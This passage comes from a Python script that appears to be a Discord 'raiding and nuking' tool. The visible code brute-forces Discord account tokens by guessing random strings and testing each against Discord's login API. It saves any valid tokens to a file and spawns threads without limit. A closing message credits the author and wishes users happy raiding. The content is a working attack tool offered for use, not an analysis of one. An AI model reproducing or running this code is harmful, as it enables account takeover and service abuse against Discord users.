                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print('[+] VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print('[-] INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()

        exit = input('press any key: ')
        exit = spammer()


    if choice == 12:
        print('''Wassup buddy. This is fun made tool by Lososik...      
If you have got some problems join https://dsc.gg/deadd or contact Lososik#0954.
Enjoy Raiding and Nuking :D
Special thanks to H0LLOW for helping me with a few things.
''')


    exit = input('press any key: ')
    exit = spammer()

spammer()
